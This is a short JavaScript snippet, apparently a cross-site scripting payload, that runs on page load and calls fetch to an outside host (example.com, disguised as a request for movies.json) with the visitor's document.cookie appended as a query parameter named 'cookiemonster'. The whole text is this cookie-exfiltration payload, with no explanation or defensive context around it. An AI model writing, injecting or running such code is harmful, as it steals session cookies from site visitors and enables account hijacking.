window.onload = function() {
    fetch('http://example.com/movies.json?cookiemonster='+this.encodeURI(document.cookie))
}